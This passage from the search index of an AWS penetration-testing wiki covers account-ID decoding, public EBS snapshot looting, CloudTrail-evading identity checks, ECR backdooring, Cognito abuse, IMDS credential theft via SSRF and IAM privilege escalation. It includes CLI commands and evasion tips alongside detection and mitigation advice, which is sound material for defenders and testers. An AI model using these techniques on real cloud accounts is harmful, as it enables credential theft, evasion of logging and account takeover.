scope.</p> <p>To solve this problem, there are multiple ways to determine the account ID of IAM credentials.</p>"},{"location":"aws/enumeration/get-account-id-from-keys/#stsgetaccesskeyinfo","title":"sts:GetAccessKeyInfo","text":"<p>Likely the most straightforward way is to use sts:GetAccessKeyInfo to return the account ID of the credentials. This action will only be logged to the account calling the action (which should be your account, not the target's).</p> <pre><code>user@host:~$ aws sts get-access-key-info --access-key-id=ASIA1234567890123456\n{\n    \"Account\": \"123456789012\"\n}\n</code></pre>"},{"location":"aws/enumeration/get-account-id-from-keys/#decode-the-access-key","title":"Decode the access key","text":"<p>As originally discovered by Aidan Steele, and later improved upon by Tal Be'ery, the account ID is actually encoded into the access key itself. </p> <p>By decoding the access key using Base32 and doing a little bit shifting, we can get the account ID. Tal wrote the handy Python script below to do this:</p> <pre><code>import base64\nimport binascii\n\ndef AWSAccount_from_AWSKeyID(AWSKeyID):\n\n    trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix\n    x = base64.b32decode(trimmed_AWSKeyID) #base32 decode\n    y = x[0:6]\n\n    z = int.from_bytes(y, byteorder='big', signed=False)\n    mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)\n\n    e = (z &amp; mask)&gt;&gt;7\n    return (e)\n\n\nprint (\"account id:\" + \"{:012d}\".format(AWSAccount_from_AWSKeyID(\"ASIAQNZGKIQY56JQ7WML\")))\n</code></pre>"},{"location":"aws/enumeration/loot_public_ebs_snapshots/","title":"Loot Public EBS Snapshots","text":"<p>For EC2 instances, files and data are typically stored in Elastic Block Store (EBS) volumes. These virtual hard drives make it easy to attach and move data between your virtual machines. As an additional feature, you can create snapshots of those volumes, which you can use for backups or replication. An important security consideration of these snapshots is that they can be (accidentally or otherwise) made public, accessible for anyone to access and steal the contents of the snapshot.</p>"},{"location":"aws/enumeration/loot_public_ebs_snapshots/#making-them-public","title":"Making them Public","text":"<p>EBS Snapshots have two availability settings, Private and Public. It is important to note that EBS does not utilize resource-based policies. If a snapshot is made public via the console or through Infrastructure as Code, it will be available to anyone with no additional controls.</p> <p></p>"},{"location":"aws/enumeration/loot_public_ebs_snapshots/#finding-exposed-snapshots","title":"Finding Exposed Snapshots","text":"<p>A lot of instances of resource exposure (and subsequent exploitation) in AWS require knowing the ARN of the resource. This provides some level of security-by-obscurity, as the attacker needs to find the ARN through some means (In some cases this can also apply to vulnerabilities in AWS services themselves).</p> <p>A somewhat unique trait of EBS snapshots is that, if they are set to public, the list of those EBS snapshots is publicly available through the AWS API. From the EC2 section in the AWS console, navigate to Elastic Block Store, Snapshots, and select <code>Public snapshots</code> from the drop down. This will show all publicly available EBS snapshots (you may have to scroll through to see an accurate count).</p> <p></p> <p>To pull this list in an easily consumable format you can use the following CLI command:</p> <pre><code>aws ec2 describe-snapshots --restorable-by-user-ids all\n</code></pre> <p>As of the time of this writing there are tens of thousands of snapshots exposed. As a bonus, it is possible to filter this list by account ID, allowing you to easily target specific accounts.</p> <p>Tip</p> <p>This can be an easy, free (in terms of detection) check to look out for when exploiting AWS environments. If you steal IAM credentials, you can determine the account they are tied to and check for exposed EBS snapshots.</p> <p>To search for all public EBS snapshots associated with an AWS account, use the following command:</p> <pre><code>aws ec2 describe-snapshots --restorable-by-user-ids all --owner-ids 000000000000\n</code></pre>"},{"location":"aws/enumeration/loot_public_ebs_snapshots/#identification","title":"Identification","text":"<p>To find exposed EBS snapshots in your account you can use automated tooling such as Prowler, an open source tool to audit for AWS security. The following command can be used with version 3.0 or higher.</p> <pre><code>./prowler -c ec2_ebs_public_snapshot\n</code></pre>"},{"location":"aws/enumeration/loot_public_ebs_snapshots/#detection","title":"Detection","text":"<p>When someone makes an EBS snapshot publicly accessible, CloudTrail generates an <code>ec2:ModifySnapshotAttribute</code> event with <code>createVolumePermission</code> set to <code>{\"add\": {\"items\": [{ \"groups\": \"all\" }]}}</code>. You can use Stratus Red Team's aws.exfiltration.ec2-share-ebs-snapshot to reproduce the issue and test your detections.</p>"},{"location":"aws/enumeration/loot_public_ebs_snapshots/#additional-resources","title":"Additional Resources","text":"<p>For additional information on the risks of exposed EBS snapshots, check out this DEF CON 27 talk, <code>Finding Secrets In Publicly Exposed EBS Volumes</code> by Ben Morris (slides available here).</p>"},{"location":"aws/enumeration/whoami/","title":"Whoami - Get Principal Name From Keys","text":"<p>After finding or obtaining IAM credentials during an assessment you will need to identify what they are used for, or if they are valid. The most common method for doing so would be the get-caller-identity API call. This is beneficial for several reasons, particularly because it requires no special permissions to execute.</p> <p>Unfortunately, although it is unlikely, there is the possibility that this API call may be monitored, especially for sensitive accounts. Additionally, if our goal is to remain as stealthy as possible, we might prefer not to use this method. As a result we need alternatives. Fortunately, many AWS services will disclose the calling role along with the account ID when an error is generated. It should be noted that the principal must lack IAM permissions for this call in order for the error to return the relevant information. </p> <p>Not all API calls exhibit this behavior. For example, failed EC2 API calls will return a message similar to the following:</p> <pre><code>An error occurred (UnauthorizedOperation) when calling the DescribeInstances operation: You are not authorized to perform this operation.\n</code></pre>"},{"location":"aws/enumeration/whoami/#sqslistqueues","title":"sqs:ListQueues","text":"<p>sqs:ListQueues is a quick API call which will return the calling identity's name and account ID without logging to CloudTrail. Note that the <code>ListQueues</code> action does not appear in the documentation for SQS's compatibility with CloudTrail.</p> <pre><code>user@host:~$ aws sqs list-queues\n\nAn error occurred (AccessDenied) when calling the ListQueues operation: User: arn:aws:sts::123456789012:assumed-role/no_perms/no_perms is not authorized to perform: sqs:listqueues on resource: arn:aws:sqs:us-east-1:123456789012: because no identity-based policy allows the sqs:listqueues action\n</code></pre>"},{"location":"aws/enumeration/whoami/#pinpoint-sms-voicesendvoicemessage","title":"pinpoint-sms-voice:SendVoiceMessage","text":"<p>pinpoint-sms-voice:SendVoiceMessage is another API call that does not log to CloudTrail.</p> <pre><code>user@host:~% aws pinpoint-sms-voice send-voice-message\n\nAn error occurred (AccessDeniedException) when calling the SendVoiceMessage operation: User: arn:aws:sts::123456789012:assumed-role/no_perms/no_perms is not authorized to perform: sms-voice:SendVoiceMessage on resource: arn:aws:sms-voice:us-east-1:123456789012:/v1/sms-voice/voice/message\n</code></pre>"},{"location":"aws/enumeration/whoami/#timestream-querydescribeendpoints","title":"timestream-query:DescribeEndpoints","text":"<p>timestream-query:DescribeEndpoints is another API call that does not log to CloudTrail.</p> <pre><code>user@host:~% aws timestream-query describe-endpoints\n\nAn error occurred (AccessDeniedException) when calling the DescribeEndpoints operation: User: arn:aws:sts::123456789012:assumed-role/no_perms/no_perms is not authorized to perform: timestream:DescribeEndpoints because no identity-based policy allows the timestream:DescribeEndpoints action\n</code></pre>"},{"location":"aws/exploitation/abusing-container-registry/","title":"Abusing Elastic Container Registry for Lateral Movement","text":"<ul> <li> <p> Original Research</p> <ul> <li>Abusing Elastic Container Registry (ECR) to own AWS environments by Roi Lavie </li> <li>Docker Security : Backdooring Images with Dockerscan by Mayank Shah</li> </ul> </li> <li> <p> Required IAM Permissions</p> <p>Read and write access to an ECR registry</p> </li> </ul> <p>IAM (Identity and Access Management) is a set of consents that attach to identities, or cloud resources, to authorize what they can actually do. This means EC2 resources, and others like it, also have identities that can change the infrastructure itself. 43.9% of organizations have internet-facing workloads containing secrets and credentials, as a result, identity and access management (IAM) has become more critical than ever.</p> <p></p> <p>This post is designed to show the impact of this attack technique and help security engineers and DevOps/SecOps to detect and understand the risks of ECR and other Container registries.</p> <p>Lateral Movement through AWS ECR In the following video, I will show how by using ECR permissions you can easily distribute a backdoor to production servers, developer's laptops, or CI/CD pipelines and own the environment by gaining privileged permissions.</p> <p>Video Summary:</p> <ul> <li>An attacker\u2019s initial access can be through vulnerable applications (e.g SSRF), misconfiguration, leaked access keys, developer laptops, and more.</li> <li>The attacker gains access to resources using access to ECR</li> <li>The attacker pulls the latest docker image</li> <li>The attacker adds a layer by injecting a malicious payload to the docker image</li> <li>The attacker pushes the docker image to ECR with the latest tag</li> <li>The victim pulls the latest docker image and starts the container</li> <li>The malicious reverse shell is executed and communicates with the attacker</li> <li>The attacker steals the server's IAM credentials   (A reverse shell is an example of a simple payload but noisy technique. An attacker can inject the ECR with other techniques e.g. a hidden backdoor)</li> </ul> <p>Security Recommendations:</p> <ul> <li>Least privileges \u2014 external facing apps should not have write access or wildcard (*) permissions on ECR</li> <li>Secure CI/CD pipelines \u2014 Protect from any unauthorized access to source code repos or build tools.</li> <li>Enforce signing of docker images</li> <li>(see: https://github.com/notaryproject/notary)</li> <li>Use docker custom security profiles like AppArmor, Seccomp</li> <li>Audit and monitor access and actions on ECR using AWS CloudTrail   (If you use Container Image scanning, be aware that it will only detect the vulnerabilities of the system and will not be able to detect malicious payloads within the containers)</li> </ul> <p>Conclusions: One of the main reasons I wrote this post is to share knowledge about the importance of container registry access, especially around ECR. Although this issue poses a high risk, it is not given the required attention it deserves. More awareness is needed around the potential damage that over-privileged services can introduce.</p>"},{"location":"aws/exploitation/cognito_identity_pool_excessive_privileges/","title":"Overpermissioned AWS Cognito Identity Pools","text":"<ul> <li> <p> Additional Resources</p> <ul> <li>Exploit two of the most common vulnerabilities in Amazon Cognito with CloudGoat by Usama Rasheed</li> <li>AWS Cognito pitfalls: Default settings attackers love (and you should know about) by Lorenzo Vogelsang</li> </ul> </li> </ul> <p>A significant security flaw in applications using AWS Cognito for identity management can occur when identity pools are given excessive privileges. Excessive privileges in an Identity Pool mean that the identities (users) associated with that pool can perform actions beyond what is necessary for their role in the application.</p> <p>If an attacker successfully authenticates with the AWS Cognito service (such as through the unintended self-signup, and the corresponding identity pool has excessive privileges, the attacker can potentially perform actions that should be restricted. This might include accessing sensitive data, manipulating services, and, in some cases, privilege escalation.</p> <p>Sometimes, even unauthenticated (or anonymous users) can perform actions that should be restricted. This is because AWS Cognito allows unauthenticated users to be associated with an identity pool. If the identity pool has excessive privileges, unauthenticated users can perform actions that should be restricted.</p>"},{"location":"aws/exploitation/cognito_identity_pool_excessive_privileges/#how-it-works","title":"How it works","text":"<p>The process usually involves two key steps:</p>"},{"location":"aws/exploitation/cognito_identity_pool_excessive_privileges/#identity-retrieval","title":"Identity Retrieval:","text":"<p>This starts with an attacker successfully signing up or logging in to a vulnerable Cognito user pool. As we discussed in our previous post, this might be due to misconfigured access controls allowing unintended self-signup, or through credential stuffing, password spraying or other attack vectors against user accounts.</p> <p>When an attacker successfully authenticates, they get a set of identity tokens. The ID token, in particular, is a JWT (JSON Web Token) that contains claims about the identity of the authenticated user.  </p>"},{"location":"aws/exploitation/cognito_identity_pool_excessive_privileges/#excessive-privileges-exploitation","title":"Excessive Privileges Exploitation:","text":"<p>The next step involves the attacker using this ID token to get temporary AWS credentials from an associated Cognito Identity Pool. The Identity Pool maps identities to IAM roles and provides them with temporary AWS credentials to access AWS services.</p> <p>However, if the IAM roles associated with the Identity Pool have excessive permissions, the temporary AWS credentials that the attacker receives will allow them to perform actions that they should not be allowed to. Depending on the assigned permissions, an attacker could potentially read sensitive data from an S3 bucket, manipulate a DynamoDB table, invoke Lambda functions, or even perform privilege escalation to gain administrative rights.</p>"},{"location":"aws/exploitation/cognito_identity_pool_excessive_privileges/#exploitation","title":"Exploitation","text":"<p>The following commands can be used to get the AWS credentials, assuming you have the ID token for a valid user:</p> <p><pre><code>aws cognito-identity get-id --identity-pool-id {identity_pool_id} --account-id {account_id} --logins {login_provider}:{id_token}\n</code></pre> and then: <pre><code>aws cognito-identity get-credentials-for-identity --identity-id {identity_id} --logins {login_provider}:{id_token}\n</code></pre></p>"},{"location":"aws/exploitation/cognito_identity_pool_excessive_privileges/#impact","title":"Impact","text":"<p>The severity of this vulnerability depends on the permissions associated with the Identity Pool. In the worst case, an attacker could perform actions that are equivalent to a full AWS account takeover. This could lead to data leakage, unauthorized modification of data, and potential compliance violations.</p> <p>However, if Identity Pools are configured in accordance with the principle of least privilege, the impact of this vulnerability is significantly reduced. In this case, the attacker would only be able to perform actions that are allowed by the associated IAM roles. This might include accessing data that they should not be able to access, but it would not allow them to perform privilege escalation and actions that are not allowed directly by the IAM roles.</p>"},{"location":"aws/exploitation/cognito_user_self_signup/","title":"Unintended Self-Signup in AWS Cognito","text":"<ul> <li> <p> Additional Resources</p> <ul> <li>CloudGoat Scenario: vulnerable_cognito</li> </ul> </li> </ul> <p>A common security flaw in SaaS applications that use Amazon Cognito as the IAM authn/authz source is allowing unintended/unauthorized account creation. Many times, such applications are intended to only allow Administrators to sign up users. </p> <p>However, applications using Cognito are frequently not explicitly configured to require Administrator only sign-up. Just because a sign-up page or button is not present in the application, doesn't mean that an attacker can't sign up for an account. If \"Admin Only\" signup is not enabled in the Cognito User Pool and an attacker can identify the Cognito User Pool Client ID and required sign-up parameters, they can sign up for an account using the AWS CLI.</p>"},{"location":"aws/exploitation/cognito_user_self_signup/#how-it-works","title":"How it works","text":"<p>Identifying a Cognito User Pool Client ID for web applications and mobile applications requires different approaches.</p>"},{"location":"aws/exploitation/cognito_user_self_signup/#web-applications","title":"Web applications:","text":"<p>An attacker may identify the User Pool Client ID in a web application by inspecting the source code. This typically involves the following steps:</p> <ol> <li>Opening the web application in a web browser. </li> <li>Using the browser's 'Inspect Element' or 'View Page Source' feature (usually accessible by right-clicking on the webpage and selecting it from the menu, or from the browser's tools menu). This allows viewing the HTML, CSS, and JavaScript code of the webpage. </li> <li>Looking for the initialization of the Amazon Cognito service in the JavaScript code. This often contains the User Pool Client ID. The code might look something like AWSCognito.config.update({UserPoolId:'...', ClientId:'...'});. The string after ClientId: would be the User Pool Client ID. </li> </ol> <p>It's worth noting that best practices encourage storing sensitive data like Client IDs server-side or using secure methods of storage and transmission. However, misconfigurations can lead to these details being exposed in client-side code.</p>"},{"location":"aws/exploitation/cognito_user_self_signup/#mobile-applications","title":"Mobile applications:","text":"<p>Obtaining the User Pool Client ID from a mobile application is more complex and requires a bit more technical know-how. The steps typically involve:</p> <ol> <li>Downloading the application package (APK for Android, IPA for iOS) to a local device.</li> <li>Using a software tool to decompile the application package into its constituent files. There are several tools available for this purpose, such as apktool for Android applications or otool/class-dump for iOS applications. </li> <li>Searching through the decompiled files for references to Amazon Cognito or the User Pool Client ID. This could be in the form of a configuration file or embedded within the application's code.</li> </ol>"},{"location":"aws/exploitation/cognito_user_self_signup/#exploitation","title":"Exploitation","text":"<p>Once an attacker has identified the User Pool Client ID, they can use the AWS CLI to sign up for an account. The attacker will need to know the required sign-up parameters, which may be obtained by inspecting the sign-up page or form in the web or mobile application. The attacker can then use the following command to sign up for an account:</p> <pre><code>$ aws cognito-idp sign-up --client-id {client_id} --username {desired_username} --password {desired_password}\n</code></pre> <p>If the sign-up request fails with InvalidParameterException, it means additional user attributes are needed. In many cases, an email address is required. The attacker can then try again with the email address.</p> <pre><code>$ aws cognito-idp sign-up --client-id {client_id} --username {desired_username} --password {desired_password} --user-attributes Name=email,Value={email_address}\n</code></pre>"},{"location":"aws/exploitation/cognito_user_self_signup/#impact","title":"Impact","text":"<p>The impact of this vulnerability depends on the application. In some cases, the application may not be affected at all. In other cases, the application may be affected in a variety of ways. </p> <p>Authenticated users of an application may be allowed to perform actions that they should not be able to perform. Perhaps the application allows data to be shared between users, and the attacker can use the application to share data with other users. Perhaps the application allows users to perform actions that cost money, and the attacker can use the application to perform actions that cost money. Perhaps the application allows users to perform actions that are not allowed by the application's terms of service, and the attacker can use the application to perform actions that are not allowed by the application's terms of service.</p> <p>In addition, the attacker may be able to exchange authenticated user access for AWS credentials. This could allow the attacker to perform actions in AWS that they should not be able to perform. See Cognito Identity Pool Excessive Privileges for more information.</p>"},{"location":"aws/exploitation/ec2-metadata-ssrf/","title":"Steal EC2 Metadata Credentials via SSRF","text":"<p>Note</p> <p>This is a common and well known attack in AWS environments. Mandiant has identified attackers performing automated scanning of vulnerabilities to harvest IAM credentials from publicly-facing web applications. To mitigate the risks of this for your organization, it would be beneficial to enforce IMDSv2 for all EC2 instances which has additional security benefits. IMDSv2 would significantly reduce the risk of an adversary stealing IAM credentials via SSRF or XXE attacks.</p> <p>One of the most common techniques in AWS exploitation is abusing the Instance Metadata Service (IMDS) associated with a target EC2 instance.</p> <p>Most EC2 instances can access their IMDS at 169.254.169.254. This service is only accessible from the specific EC2 instance it is associated with. The instance metadata service contains useful information about the instance, such as its IP address, its instance type, the name of the security groups associated with it, etc.</p> <p>If an EC2 instance has an IAM role attached to it, IAM credentials associated with that role can be retrieved from the metadata service. Because of this, attackers will frequently target the IMDS to steal those credentials.</p>"},{"location":"aws/exploitation/ec2-metadata-ssrf/#stealing-iam-credentials-from-the-instance-metadata-service","title":"Stealing IAM Credentials from the Instance Metadata Service","text":"<p>If the EC2 instance is configured to use the default instance metadata service version 1, it is possible to steal IAM credentials from the instance without getting code execution on it.</p> <p>This can be done by abusing existing applications running on the host. By exploiting common vulnerabilities such as server side request forgery (SSRF) or XML external entity (XXE) flaws, an adversary can coerce an application running on the host to retrieve those IAM credentials.</p> <p>To demonstrate this, in the following example there is a web server running on port 80 of the EC2 instance. This web server has a simple SSRF vulnerability, allowing us to make GET requests to arbitrary addresses. We can leverage this to make a request to <code>http://169.254.169.254</code>.</p> <p></p> <p>To determine if the EC2 instance has an IAM role associated with it, we can make a request to <code>http://169.254.169.254/latest/meta-data/iam/</code>. A 404 response indicates there is no IAM role associated. You may also get a 200 response that is empty, this indicates that there was an IAM Role however it has since been revoked.</p> <p>If there is a valid role we can steal, we can make a request to <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>. This will return the name of the IAM role associated with the credentials. In the example below we see that the role name is 'ec2-default-ssm'.</p> <p></p> <p>To retrieve the credentials, we can append the role name to the previous query. For example, with the role name shown previously, the query would be <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm/</code>.</p> <p></p> <p>These credentials can then be used in the AWS CLI to make calls to the API. To learn more about using stolen IAM credentials, check out this comprehensive guide.</p> <p>Note</p> <p>An adversary who has gained code execution on the EC2 instance can retrieve credentials from the IMDS regardless of the version being used. Therefore, it is important to continually monitor your environment for suspicious activities.</p>"},{"location":"aws/exploitation/ec2-metadata-ssrf/#additional-resources","title":"Additional Resources","text":"<p>For an example of this technique being used in the wild along with additional information, please see Kevin Fang's excellent video on the 2019 Capital One breach.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/","title":"AWS IAM Privilege Escalation Techniques","text":"<ul> <li> <p> Original Research</p> <p> <p>AWS IAM Privilege Escalation \u2013 Methods and Mitigation by Spencer Gietzen</p> <p></p> </p> </li> <li> <p> Additional Resources</p> <ul> <li>AWS IAM Privilege Escalation Methods</li> <li>Well, That Escalated Quickly: Privilege Escalation in AWS by Gerben Kleijn</li> </ul> </li> </ul> <p>Note</p> <p>If you'd like to get hands on experience exploiting these misconfigurations, check out iam-vulnerable by Seth Art.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#codestarcreateproject-codestarassociateteammember","title":"codestar:CreateProject, codestar:AssociateTeamMember","text":"<p>With access to the codestar:CreateProject and codestar:AssociateTeamMember permissions, an adversary can create a new CodeStar project and associate themselves as an Owner of the project.</p> <p>This will attach a new policy to the user that provides access to a number of permissions for AWS services. This is most useful for further enumeration as it gives access to lambda:List*, iam:ListRoles, iam:ListUsers, and more.</p> <p></p> <p></p>"},{"location":"aws/exploitation/iam_privilege_escalation/#glueupdatedevendpoint","title":"glue:UpdateDevEndpoint","text":"<p>With access to the glue:UpdateDevEndpoint permission, an adversary can update the existing SSH key associated with the glue endpoint. This will allow the adversary to SSH into the host and gain access to IAM credentials associated with the role attached to the glue endpoint. Though not required, it may be helpful to have the glue:GetDevEndpoint permission as well, if the existing endpoint cannot be identified via other means. </p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamaddusertogroup","title":"iam:AddUserToGroup","text":"<p>With access to the iam:AddUserToGroup permission, an adversary can add an IAM user they control to an existing group with more privileges. Although this is not required, it may be helpful to have other permissions in the IAM family to identify other groups and their privileges. </p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamattachgrouppolicy","title":"iam:AttachGroupPolicy","text":"<p>With access to the iam:AttachGroupPolicy permission, an adversary can attach an IAM policy to a group they are a member of. This potentially includes policies such as AdministratorAccess, which would provide them (surprise) administrator access to the AWS account.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamattachrolepolicy","title":"iam:AttachRolePolicy","text":"<p>With access to the iam:AttachRolePolicy permission, an adversary can attach an IAM policy to a role they have access to. This potentially includes policies such as AdministratorAccess, which would provide them administrator access to the AWS account.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamattachuserpolicy","title":"iam:AttachUserPolicy","text":"<p>With access to the iam:AttachUserPolicy permission, an adversary can attach an IAM policy to an IAM user they have access to. This potentially includes policies such as AdministratorAccess, which would provide them administrator access to the AWS account.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamcreateaccesskey","title":"iam:CreateAccessKey","text":"<p>With access to the iam:CreateAccessKey permission, an adversary can create an IAM Access Key and Secret Access Key for other users. This would allow them to create credentials for more privileged users and have access to their privileges.</p> <p></p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamcreateloginprofile","title":"iam:CreateLoginProfile","text":"<p>With access to the iam:CreateLoginProfile permission, an adversary can create a password for a more privileged IAM user to login to the console as. Note: if a password is already set, you must use iam:UpdateLoginProfile instead.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamcreatepolicyversion","title":"iam:CreatePolicyVersion","text":"<p>With access to the iam:CreatePolicyVersion permission, an adversary can create a new version of a existing policy with more privilege. If the adversary has access to the principal that policy is attached to, they can elevate their privileges.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamdeleterolepermissionsboundary","title":"iam:DeleteRolePermissionsBoundary","text":"<p>With access to the iam:DeleteRolePermissionsBoundary permission, an adversary can remove a permissions boundary from a role they have access to. This may increase the role's effective permissions if the permissions boundary was more restrictive than any of the role's identity-based policies. </p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamdeleterolepolicy","title":"iam:DeleteRolePolicy","text":"<p>With access to the iam:DeleteRolePolicy permission, an adversary can delete an inline policy from a role they have access to. This may increase the role's effective permissions if the policy contains explicit deny statements that any of the role's other policies allow.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamdeleteuserpermissionsboundary","title":"iam:DeleteUserPermissionsBoundary","text":"<p>With access to the iam:DeleteUserPermissionsBoundary permission, an adversary can remove a permissions boundary from a user they have access to. This may increase the user's effective permissions if the permissions boundary was more restrictive than any of the role's identity-based policies. </p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamdeleteuserpolicy","title":"iam:DeleteUserPolicy","text":"<p>With access to the iam:DeleteUserPolicy permission, an adversary can delete an inline policy from a user they have access to. This may increase the user's effective permissions if the policy contains explicit deny statements that any of the user's other policies allow.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamdetachrolepolicy","title":"iam:DetachRolePolicy","text":"<p>With access to the iam:DetachRolePolicy permission, an adversary can remove a managed policy from a role they have access to. This may increase the role's effective permissions if the policy contains explicit deny statements that any of the role's other policies allow.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamdetachuserpolicy","title":"iam:DetachUserPolicy","text":"<p>With access to the iam:DetachUserPolicy permission, an adversary can remove a managed policy from a user they have access to. This may increase the user's effective permissions if the policy contains explicit deny statements that any of the user's other policies allow.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-autoscalingcreateautoscalinggroup-or-autoscalingupdateautoscalinggroup-autoscalingcreatelaunchconfiguration","title":"iam:PassRole, autoscaling:CreateAutoScalingGroup or autoscaling:UpdateAutoScalingGroup, autoscaling:CreateLaunchConfiguration,","text":"<p>With access to the iam:PassRole, autoscaling:CreateLaunchConfiguration, autoscaling:CreateAutoScalingGroup, and autoscaling:UpdateAutoScalingGroup permissions, an adversary can create a launch configuration and leverage it in an autoscaling group to pass a more privileged role to it. This would allow an adversary to escalate privileges to that more privileged role.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-autoscalingcreateautoscalinggroup-or-autoscalingupdateautoscalinggroup-ec2createlaunchtemplate","title":"iam:PassRole, autoscaling:CreateAutoScalingGroup or autoscaling:UpdateAutoScalingGroup, ec2:CreateLaunchTemplate","text":"<p>With access to the iam:PassRole, ec2:CreateLaunchTemplate, autoscaling:CreateAutoScalingGroup, and autoscaling:UpdateAutoScalingGroup permissions, an adversary can create a launch template and leverage it in an autoscaling group to pass a more privileged role to it. This would allow an adversary to escalate privileges to that more privileged role.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-cloudformationcreatestack","title":"iam:PassRole, cloudformation:CreateStack","text":"<p>With access to the iam:PassRole and cloudformation:CreateStack permissions, an adversary can create a new CloudFormation stack and pass a more privileged role to it. This would allow an adversary to escalate privileges to that more privileged role.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-codestarcreateproject","title":"iam:PassRole, codestar:CreateProject","text":"<p>With access to the iam:PassRole and codestar:CreateProject permissions, an adversary can create a new CodeStar project and pass a more privileged role to it. This would allow an adversary to escalate privileges to that more privileged role including that of an administrator.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-datapipelineactivatepipeline-datapipelinecreatepipeline-datapipelineputpipelinedefinition","title":"iam:PassRole, datapipeline:ActivatePipeline, datapipeline:CreatePipeline, datapipeline:PutPipelineDefinition","text":"<p>With access to the iam:PassRole, datapipeline:ActivatePipeline, datapipeline:CreatePipeline, and datapipeline:PutPipelineDefinition permissions, an adversary can create a new pipeline and pass in a more privileged role. It is worth noting that to do this the AWS account must already contain a role that can be assumed by DataPipeline and that role must have greater privileges (or at least different ones) than the principal the adversary controls.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-ec2runinstances","title":"iam:PassRole, ec2:RunInstances","text":"<p>With access to the iam:PassRole and ec2:RunInstances permissions, an adversary can create a new EC2 instance and pass a more privileged role to it.</p> <p>This can be taken advantage of with the following one-liner:</p> <p></p> <p>Some things to note: The instance profile must already exist, and (realistically) it must have greater permissions than the role you have access to. If you also have the ability to create a role, this can be leveraged (although you may as well set the trust policy of that role to one you control at that point). The role that is being passed must have a trust policy allowing the EC2 service to assume it. You cannot pass arbitrary roles to an EC2 instance.</p> <p>A common misconception about this attack is that an adversary must have access to an existing SSH key, or be able to spawn an SSM session. This is not actually true, you can leverage user data to perform an action on the host. One common example is to have the EC2 instance curl the metadata service, retrieve the IAM credentials, and then send them to an attacker controlled machine using curl.</p> <p>Another (stealthier) example would be to perform all your API operations at once in the user-data script. This way you are not dinged with the IAM credential exfiltration finding (which can be bypassed).</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-gluecreatedevendpoint","title":"iam:PassRole, glue:CreateDevEndpoint","text":"<p>With access to the iam:PassRole and glue:CreateDevEndpoint permissions, an adversary can create a new Glue development endpoint and pass in a more privileged role. It is worth noting that to do this the AWS account must already contain a role that can be assumed by Glue and that role must have greater privileges (or at least different ones) than the principal the adversary controls.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-gluecreatejob","title":"iam:PassRole, glue:CreateJob","text":"<p>With access to the iam:PassRole and glue:CreateJob permissions, an adversary can create a new Glue job and pass in a more privileged role. The AWS account must already contain a role that can be assumed by Glue and that role must have greater privileges (or at least different ones) than the principal the adversary controls. The glue:StartJobRun privilege would allow for the job to be run.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-glueupdatejob","title":"iam:PassRole, glue:UpdateJob","text":"<p>With access to the iam:PassRole and glue:UpdateJob permissions, an adversary can update the role and command associated with a Glue job. The AWS account must already contain a role that can be assumed by Glue and that role must have greater privileges (or at least different ones) than the principal the adversary controls. The glue:StartJobRun privilege or some pre-existing trigger could cause the job to run.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-lambdaaddpermission-lambdacreatefunction","title":"iam:PassRole, lambda:AddPermission, lambda:CreateFunction","text":"<p>With access to the iam:PassRole, lambda:AddPermission, and lambda:CreateFunction permissions, an adversary can create a Lambda function with an existing role. This function could then by updated with lambda:AddPermission to allow another principal in another AWS account the permission to invoke it. It is worth noting that the AWS account must already contain a role that can be assumed by Lambda.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-lambdacreateeventsourcemapping-lambdacreatefunction","title":"iam:PassRole, lambda:CreateEventSourceMapping, lambda:CreateFunction","text":"<p>With access to the iam:PassRole, lambda:CreateEventSourceMapping, and lambda:CreateFunction permissions, an adversary can create a Lambda function with an existing privileged role and associating it with a DynamoDB table. Then, when a new record is inserted into the table, the Lambda function will trigger with the privilege of the passed in role.</p> <p>It is worth noting that the AWS account must already contain a role that can be assumed by Lambda. Additionally, while not required, it may be beneficial to have the dynamodb:CreateTable and dynamodb:PutItem permissions to trigger this yourself.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iampassrole-lambdacreatefunction-lambdainvokefunction","title":"iam:PassRole, lambda:CreateFunction, lambda:InvokeFunction","text":"<p>With access to the iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction permissions, an adversary can create a new Lambda function and pass an existing role to it. They can then invoke the function allowing them access to the privileges of the role associated with the function. It is worth noting that unless the adversary can create a role, they must use an already existing role that can be assumed by Lambda.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamputgrouppolicy","title":"iam:PutGroupPolicy","text":"<p>With access to the iam:PutGroupPolicy permission, an adversary can create an inline policy for a group they are in and give themselves administrator access to the AWS account.</p>"},{"location":"aws/exploitation/iam_privilege_escalation/#iamputrolepermissionsboundary","title":"iam:PutRolePermissionsBoundary","text":"<p>With access to the iam:PutRolePermissionsBoundary permission, an adversary can update a permissions boundary attached to a role they have access to. This may increase the role's effective permissions if the permissions boundary was more restrictive than any of the role's identity-based policies. 